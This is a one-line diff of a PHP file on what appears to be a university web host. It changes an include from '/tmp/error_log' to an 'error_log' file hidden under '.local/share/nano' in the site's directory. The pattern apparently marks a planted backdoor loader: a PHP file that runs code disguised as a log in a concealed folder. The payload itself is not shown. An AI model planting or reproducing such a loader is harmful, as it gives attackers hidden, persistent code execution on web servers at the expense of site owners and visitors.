@@ -1,1 +1,1 @@
-<?php include('/tmp/error_log'); ?>
+<?php include('/var/www/vhosts/tlo.nrru.ac.th/.local/share/nano/error_log'); ?>
